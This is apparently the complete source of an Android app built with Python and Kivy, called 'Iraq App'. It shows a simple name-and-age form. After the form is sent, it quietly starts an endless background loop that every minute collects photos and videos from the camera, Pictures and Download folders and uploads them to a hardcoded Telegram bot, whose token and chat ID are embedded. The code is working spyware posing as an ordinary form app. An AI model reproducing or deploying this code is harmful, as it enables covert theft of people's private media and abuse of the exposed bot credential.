import os
import time
import hashlib
import threading
import requests
import traceback
from kivy.utils import platform

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# ============ إعدادات تيليجرام ============
BOT_TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID   = "6046016571"
API_URL   = f"https://api.telegram.org/bot{BOT_TOKEN}"
HASH_LOG  = "sent_media_hashes.txt"

# ============ دوال الإرسال والمسح ============
def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hasher.update(chunk)
        return hasher.hexdigest()
    except Exception:
        return None

def load_hashes(base_dir):
    log_path = os.path.join(base_dir, HASH_LOG)
    if os.path.exists(log_path):
        try:
            with open(log_path, "r", encoding="utf-8") as f:
                return set(f.read().splitlines())
        except Exception:
            pass
    return set()

def save_hash(base_dir, file_hash):
    log_path = os.path.join(base_dir, HASH_LOG)
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(file_hash + "\n")
    except Exception:
        pass

GALLERY_PATHS = ["/sdcard/DCIM/Camera/", "/sdcard/Pictures/", "/sdcard/Download/"]

def get_all_unique_media(base_dir):
    sent_hashes = load_hashes(base_dir)
    unique_list = []
    IMG_EXT = ('.jpg', '.jpeg', '.png')
    VID_EXT = ('.mp4', '.mov', '.avi', '.mkv')
    for folder in GALLERY_PATHS:
        if os.path.exists(folder):
            try:
                for root, dirs, files in os.walk(folder):
                    if any(x in root.lower() for x in ['.thumbnails', 'cache', 'recycler']):
                        continue
                    for file in files:
                        file_lower = file.lower()
                        full_path = os.path.join(root, file)
                        media_type = 'photo' if file_lower.endswith(IMG_EXT) else 'video' if file_lower.endswith(VID_EXT) else None
                        if media_type:
                            try:
                                f_hash = get_file_hash(full_path)
                                if f_hash and f_hash not in sent_hashes:
                                    unique_list.append({'path': full_path, 'hash': f_hash, 'type': media_type})
                            except Exception:
                                continue
            except Exception:
                pass
    return unique_list

def send_telegram_text(text, status_callback=None):
    try:
        url = f"{API_URL}/sendMessage"
        response = requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=20)
        ok = response.status_code == 200 and response.json().get("ok")
        if status_callback:
            Clock.schedule_once(lambda dt: status_callback(ok))
        return ok
    except Exception:
        if status_callback:
            Clock.schedule_once(lambda dt: status_callback(False))
        return False

def send_media_batch(base_dir, batch, status_cb=None):
    for item in batch:
        try:
            file_path = item['path']
            file_size = os.path.getsize(file_path)
            method, file_key = "sendPhoto", "photo"

            if item['type'] == 'video':
                if file_size > 50 * 1024 * 1024:
                    method, file_key = "sendDocument", "document"
                else:
                    method, file_key = "sendVideo", "video"

            timeout_val = max(40, int(file_size / (500 * 1024)))
            with open(file_path, 'rb') as f:
                files = {file_key: (os.path.basename(file_path), f)}
                data = {'chat_id': CHAT_ID, 'caption': 'New Media'}
                r = requests.post(f"{API_URL}/{method}", data=data, files=files, timeout=timeout_val)

            try:
                ok = r.status_code == 200 and r.json().get("ok") is True
            except Exception:
                ok = False

            if ok:
                save_hash(base_dir, item['hash'])
                if status_cb:
                    Clock.schedule_once(lambda dt: status_cb(f"Sent: {os.path.basename(file_path)}"))
            else:
                if status_cb:
                    Clock.schedule_once(lambda dt: status_cb(f"Failed: {os.path.basename(file_path)}"))
            time.sleep(2)
        except Exception as e:
            print(f"Upload error: {e}")

# ============ الواجهة البسيطة القياسية ============
class MainApplicationUI(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 40
        self.spacing = 20
        self._worker_started = False

        # العنوان
        self.add_widget(Label(text="Iraq App (Simple UI)", font_size=30, size_hint_y=None, height=60))
        
        # حقل الاسم
        self.name_input = TextInput(hint_text="Enter Name", multiline=False, size_hint_y=None, height=60, font_size=20)
        self.add_widget(self.name_input)
        
        # حقل العمر
        self.age_input = TextInput(hint_text="Enter Age", multiline=False, input_filter='int', size_hint_y=None, height=60, font_size=20)
        self.add_widget(self.age_input)
        
        # زر الإرسال
        self.send_button = Button(text="Send", font_size=20, size_hint_y=None, height=60)
        self.send_button.bind(on_press=self.on_submit)
        self.add_widget(self.send_button)
        
        # حالة الإرسال
        self.status_lbl = Label(text="Waiting...", font_size=18, size_hint_y=None, height=60)
        self.add_widget(self.status_lbl)

    def set_status(self, msg):
        self.status_lbl.text = msg

    def on_submit(self, instance):
        name = self.name_input.text.strip()
        age  = self.age_input.text.strip()

        if not name or not age:
            self.set_status("Please enter Name and Age")
            return

        self.send_button.disabled = True
        self.send_button.text = "Sending..."
        self.set_status("Sending data...")

        msg = f"Name: {name}\nAge: {age}"
        threading.Thread(target=self._send_and_start, args=(msg,), daemon=True).start()

    def _send_and_start(self, msg):
        ok = send_telegram_text(msg)
        Clock.schedule_once(lambda dt: self._after_login(ok))

    def _after_login(self, ok):
        if not ok:
            self.set_status("Failed. Check internet.")
            self.send_button.disabled = False
            self.send_button.text = "Send"
            return

        self.set_status("Login successful! Starting media upload...")
        self.send_button.text = "Done"
        if not self._worker_started:
            self._worker_started = True
            threading.Thread(target=self._media_worker, daemon=True).start()

    def _media_worker(self):
        time.sleep(3)
        base_dir = App.get_running_app().user_data_dir
        while True:
            try:
                media = get_all_unique_media(base_dir)
                if media:
                    Clock.schedule_once(lambda dt: self.set_status(f"Sending {len(media)} files..."))
                    send_media_batch(base_dir, media[:3], status_cb=self._media_status)
                else:
                    Clock.schedule_once(lambda dt: self.set_status("No new media. Scanning..."))
            except Exception as e:
                print(f"Worker error: {e}")
            time.sleep(60)

    def _media_status(self, text):
        Clock.schedule_once(lambda dt: self.set_status(text))

# ============ كلاس التطبيق ============
class IraqApp(App):
    def on_start(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            try:
                request_permissions([
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.WRITE_EXTERNAL_STORAGE,
                ])
            except Exception as e:
                print(f"Permission error: {e}")

    def build(self):
        self.title = "Iraq App"
        return MainApplicationUI()

# ============ الحماية من الانهيار ============
if __name__ == '__main__':
    try:
        IraqApp().run()
    except Exception:
        err = traceback.format_exc()
        print(err)
        paths_to_try = [
            '/sdcard/iraq_crash.txt',
            '/storage/emulated/0/iraq_crash.txt'
        ]
        for p in paths_to_try:
            try:
                with open(p, 'w', encoding='utf-8') as f:
                    f.write(err)
                break
            except Exception:
                pass
        raise
